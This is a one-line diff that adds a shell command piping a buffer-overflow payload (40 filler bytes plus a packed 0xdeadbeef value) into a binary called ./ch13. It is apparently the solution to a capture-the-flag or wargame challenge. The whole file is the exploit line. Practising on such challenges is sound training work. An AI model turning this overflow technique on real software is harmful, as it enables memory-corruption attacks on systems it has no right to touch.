@@ -1,0 +1,1 @@
+(python -c 'import struct;print "\x41"*(40) + struct.pack("<I", 0xdeadbeef)'; tee) | ./ch13
